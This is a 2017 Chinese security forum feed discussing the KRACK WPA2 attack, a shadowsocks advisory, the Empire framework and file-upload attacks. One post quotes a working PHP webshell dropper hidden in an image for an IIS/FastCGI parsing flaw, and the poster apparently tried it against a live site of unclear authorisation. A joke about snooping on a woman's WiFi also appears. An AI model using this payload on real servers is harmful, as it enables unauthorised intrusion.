<img src="https://file.xiaomiquan.com/44/3b/443b7f67fe65375a441d097c8af38fc34f4c994a9b0ef7453481d8c6b6af536a_big.jpg" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__ on 2017-10-18:

WPA2密码重装攻击的POC，python脚本写的附带原理论文PDF，www.github.com/jiansiting/wpa2-krack

<img src="https://file.xiaomiquan.com/ee/87/ee87523c7470f1d20a91683c1f6b842296024c2335095132e43a6b01a64bf3b8.jpg" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 效果如何

<img src="https://file.xiaomiquan.com/c3/ff/c3ff7b7a3452ad4f7a0a6d1eb752f9b3a7e5bceeafff53d1372943527450dde0.jpg" width="25px"/> __唐古拉老山羊__: 像我这样英文渣，文献根本看不懂啊

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 源头在这:
[krack - Pastebin.com](https://pastebin.com/aZyyS16w)



<img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 效果可以，就是严格按照pdf可以走下来，创建了一个同名AP获取数据包。

<img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__ replies to <img src="https://file.xiaomiquan.com/c3/ff/c3ff7b7a3452ad4f7a0a6d1eb752f9b3a7e5bceeafff53d1372943527450dde0.jpg" width="25px"/> __唐古拉老山羊__: 可以参考部分中文

<img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 我这个是一个github上的朋友发给我的研究和测试的，看开来你提供这个连接应该是最早的poc代码了

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ replies to <img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__: 只是FT，貌似的支持802.11r 才可以

<img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 没错，你看得很仔细，程序的一开始就用文本说明了这个地方

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 
[GitHub - vanhoefm/krackattacks-test-ap-ft](https://github.com/vanhoefm/krackattacks-test-ap-ft)



<img src="https://file.xiaomiquan.com/7e/6e/7e6e47b51f5a9733c99849a1458f703fdb6abecf319d98a1500d009c1f02b46a.jpg" width="25px"/> __Sunset__: 所以，只能针对FT协议的WiFi？并不能wpa2吗？


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-10-18:

关于dark Web(不限于Tor)，关于Anonymous network，darknet，这个博客科普、辟谣、指路了非常多信息，推荐好好阅读每篇文章！

[Secrets of the Dark | Lighting a match in the dark...](https://direclown.wordpress.com)



<img src="https://file.xiaomiquan.com/51/c6/51c6eee1c7adb3e5d91c5c6b80466f3043b7236c27a734fc97ff7e5a73852821.jpg" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/b1/56/b156dd5922a0993bd78f5d2404738b9944e81129e5276fcd59a045192247509c.jpg" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/c5/cf/c5cf53d012e4270479ea8b3c10283f33d2fd27f0567f860006f1c622f806e15a.jpg" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/74/3f/743f78265bfd6981b27d8fc6ee4a7fced0cf6478fcaa48667f1ab24f8a60d7f1.jpg" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 不错，很详细


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-18:


__#姿势#__

  WPA2 这个 KRACK 攻击，推荐看 Longas杨叔 这篇文章，清晰明了：


[WPA2被攻破？全球WiFi瘫痪？WiFi末日到来？能再夸张点不](http://mp.weixin.qq.com/s/nEfwjrE3AOORVC89TJHBtg)





...

<img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__: 刚看完，杨叔的公众号也是你之前推的😂

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__: 嗯

<img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__: 用python脚本poc复现了，代码上传到github了


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-16:


__#漏洞#__

   关于 WPA2 这个 KRACK 攻击


[https://www.krackattacks.com/](https://www.krackattacks.com/)



今天炒的火热，很多文章标题党也是正常现象，毕竟这是个专业话题...

由于白天都很忙，这里简单转几句我们后来的交流，供大家理解。

Longas杨叔：“花时间仔细看了视频和说明文档，这个 KRACK ATTACK 攻击应该是目前最取巧的针对 WPA/WPA2 的中间人攻击方法。并不针对 WPA 加密本身，而是通过多次重播四次握手的消息3来强制复位本地保存的 WPA 密钥，即把原来正确真实的 WPA 密码替换掉，不破解直接替换，这样就可以将受害者连到伪造的 AP 上，无需任何提示，再配合 SSLStrip 之类的工具做中间人就圆满地实现了基于 Wi-Fi 的无缝中间人攻击。”

余弦：“这个戏法最终是对 Client，视频演示很明显。这种攻击作者也偷懒了，没提这个 MITM（SSLStrip）没法对 Google 进行，大家知道为什么吗？原因是：HSTS。”

目前来看，这个漏洞实战意义还是不错的，要修复应该也不是什么难事。那些乱喊 WPA2 要死的文章，笑笑就罢了。

更多细节等后续再看值得补充就再补充吧。

<img src="https://file.xiaomiquan.com/05/07/05079510f9e4c0efbf78f55d9373d5d790d0be05d794132df47b309ba3476eb1.png" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/c4/d9/c4d9438fb65e0c25a109b77130c9021a79472a8bb4d494b375f37b612ef88465.png" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-10-16:

拭目以待

[KRACK Attacks: Breaking WPA2](https://www.krackattacks.com/)





...

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 细节已放出

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 还有演示视频
[https://www.youtube.com/watch?v=Oh4WURZoR98](https://www.youtube.com/watch?v=Oh4WURZoR98)



<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 要是真裸奔了。。。每天就拿着pc去妹子楼下等她回家。


...

---

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ on 2017-10-15:

看到一篇关于端口渗透的总结，认真读完发现自己还有一些是自己没见过的，不知道算不算全面，有好的希望大牛们能分享一下。QAQ
有个师傅给我的建议是找相应的版本，docker部署测试。

[端口渗透总结_91Ri.org](http://www.91ri.org/15441.html)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 肯定不全面呀，看看ZoomEye/Shodan都采集那些端口就知道渗透会关注哪些端口

<img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__: 很多链接点进去都是升级中。。

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__: 你不知道wooyun?

<img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 知道啊，而且有的百度网盘地址也没了[捂脸]

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 😂😂😂,但是里面的案例挺多的，都可以找的到。
刚知道wooyun的时候已经升级四五个月了。🌝，原来他们厂商的妹子这么可爱。😊😊

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__: 有个玩意叫做镜像QAQ，静香静香，我是胖虎

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 
[端口渗透总结](http://docs.ioin.in/writeup/blog.heysec.org/_archives_577/index.html)




你们之前发的

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: ?
怎么啦。[囧]

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 没事，就是和这个文章一样

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 文章里面的附件都失效了

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 附件是一个各种端口的总结嘛，百度有很多啊

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 然后实际乌云漏洞库一搜就有。


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-10-14:

ss的C语言版server端本地命令执行漏洞
问题出在method参数


[Advisory X41-2017-010: Command Execution in shadow...](https://x41-dsec.de/lab/advisories/x41-2017-010-shadowsocks-libev/)





...

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 另外Python版的ss有个autoban.py，本意是防爆破的，结果存在远程命令执行

<img src="https://file.xiaomiquan.com/ed/8e/ed8e264a6c1b3e6acd2f7423ad6ccc19dfd5810cd3b64c1a1c58cc6e04010c56.jpg" width="25px"/> __bit4__ replies to <img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 没见到有autoban.py这个文件啊

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/ed/8e/ed8e264a6c1b3e6acd2f7423ad6ccc19dfd5810cd3b64c1a1c58cc6e04010c56.jpg" width="25px"/> __bit4__: 版本不一样吧

<img src="https://file.xiaomiquan.com/88/74/8874c2e75dca87eba12d12a4c6f9a0b794ad3acffe3e26e4bb4bf3443a32db2e.jpg" width="25px"/> __GUO__: 我问问现在怎么合法fq

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/88/74/8874c2e75dca87eba12d12a4c6f9a0b794ad3acffe3e26e4bb4bf3443a32db2e.jpg" width="25px"/> __GUO__: 貌似企业用户可以去工信部申请


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-13:


__#工具#__

  渗透利用神器 Empire 2.2 发布及一点看法


[Empire 2.2 – Maintaining an Empire – rvrsh3ll’s Bl...](http://www.rvrsh3ll.net/blog/empire/empire-2-2-maintaining-an-empire/)

 

优化了一些问题及增加了一些特性，英文很简单自己看吧。还可以搜搜本圈，之前也发过历史相关。这些 Red Team 牛人在加速 Empire 发展，下一版本说是直接跳到 3.0。

特别说下，Empire 估计不会特别去发展混淆 Empire 技术，他们觉得和杀软们玩打地鼠游戏没意思。其实这个我赞同，文件静态免杀应该自己来，脚本混淆多简单的事。Empire 在渗透其他方面如绕过、伪装、隐藏一直在提升，不过对抗是动态的，不断进化是必然的。

Empire 确实是很优秀的渗透利用框架（其实就是个远控）。Empire 生态能发展还有个重要特性：

REST API。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-13:


__#工具#__

  渗透利用神器 Empire 2.2 发布及一点看法


[Empire 2.2 – Maintaining an Empire – rvrsh3ll’s Bl...](http://www.rvrsh3ll.net/blog/empire/empire-2-2-maintaining-an-empire/)

 

优化了一些问题及增加了一些特性，英文很简单自己看吧。还可以搜搜本圈，之前也发过历史相关。这些 Red Team 牛人在加速 Empire 发展，下一版本说是直接跳到 3.0。

特别说下，Empire 估计不会特别去发展混淆 Empire 技术，他们觉得和杀软们玩打地鼠游戏没意思。其实这个我赞同，文件静态免杀应该自己来，脚本混淆多简单的事。Empire 在渗透其他方面如绕过、伪装、隐藏一直在提升，不过对抗是动态的，不断进化是必然的。

Empire 确实是很优秀的渗透利用框架（其实就是个远控）。Empire 生态能发展还有个重要特性：

REST API。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-13:

推荐看看 GitHub 2017 的这份统计，了解下趋势。


[Python 崛起、JavaScript 制霸 —— GitHub 2017 年度开源报告里的语言之...](http://mp.weixin.qq.com/s/2cWc6O3_38u0eaPmXt-auQ)

 

正好对于我来说，Python 和 JavaScript 是我最熟悉的两门语言。



...

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 然并卵呀呀

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 为啥

<img src="https://file.xiaomiquan.com/82/82/82825b7290b34936832ec9ff5972ecb1fc30b8ee53d26751f4601f50470e4117.jpg" width="25px"/> __星辰大海__: 人生苦短，我用Py。


...

---

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ on 2017-10-13:

几个基友的总结，上传攻击可以说总结的很详细了。

[Upload-Attack](https://04z.net/2017/07/31/Upload-Attack/)

 
-----------------QAQ------------------
顺便提出一个问题，seay博客有一段话，关于iis7.5的解析漏洞的利用:
[+]IIS 7.0/IIS 7.5/Nginx <=0.8.37

IIS 7.0/IIS 7.5/Nginx <=0.8.37

在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将 /xx.jpg/xx.php 解析为 php 文件。

常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾

e.g.  copy xx.jpg/b + yy.txt/a xy.jpg

######################################

/b 即二进制[binary]模式

/a 即ascii模式 xx.jpg正常图片文件

yy.txt 内容 <?PHP fputs(fopen(‘shell.php’,’w’),'<?php eval($_POST[cmd])?>’);?>

意思为写入一个内容为 <?php eval($_POST[cmd])?> 名称为shell.php的文件

######################################

找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上 /xx.php 即可执行恶意文本。

然后就在图片目录下生成一句话木马 shell.php 密码 cmd。
我在其他地方看到的是上传jpg后再加上/.php，但是昨天我遇到的那个站点，上传后行不通，404状态，用seay的这个方法也不行，而且也不太明白他这个方法的原理。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这些细节还是得刨根问底

<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__: 你的站具体环境是否知道？

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__: iis 7.5+php 5.3,看页面像用的模板，像是定制的。感觉唯一能在后台往服务器加东西的地方只有上传图片那里。

<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 怎么确认是否开启的是fastcgi模式

<img src="https://file.xiaomiquan.com/70/06/7006f382b2abf63b4f3ea8ad49decda9a4e5e30ffc4b9b0a6844ed3d38ca6603.jpg" width="25px"/> __super__: 文章总结的很强

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__: 不知道。cgi还没扫描。

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 还有，cgi跟fastcgi不是一个东西。

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 知道，这两个理解的不是很清楚。

<img src="https://file.xiaomiquan.com/85/7e/857e7074cd57069c52c64361162a16153347497cda25cad85d234445a06ef8b2.jpg" width="25px"/> __愤怒CPU__: 以前自己搭建试过，大部分web集成包，如wdcp，phpstudy 默认都不会开启这个参数。

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 这是fastcgi的漏洞，php解析有多种方法，并不是说所有的iis 7.5都有这个问题

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 原来如此，很多原理还不明白，谢谢指点。


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-10-12:

一加氧OS窃密事件，没事给自己的设备做做流量分析，也许就发现。。。
[OnePlus OxygenOS built-in analytics](https://www.chrisdcmoore.co.uk/post/oneplus-analytics/)



<img src="https://file.xiaomiquan.com/cb/2c/cb2c84dd33d174bb8d52e92a3356f6a6a8c27645825f4f79341eb1581184c767.jpg" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/3e/bc/3ebce5c2bb67c5ad0ea4e2d0dd0d9b2c60e444bc18d1021d44aea7b315216686.jpg" width="25px"/> __heather__: 无语

<img src="https://file.xiaomiquan.com/df/db/dfdb475f56fe4b4b719dce753a972e44dde472d02173b528a841c3d4c41bcf1c.jpg" width="25px"/> __静候佳音__: 手持一加手机一脸茫然


...

---


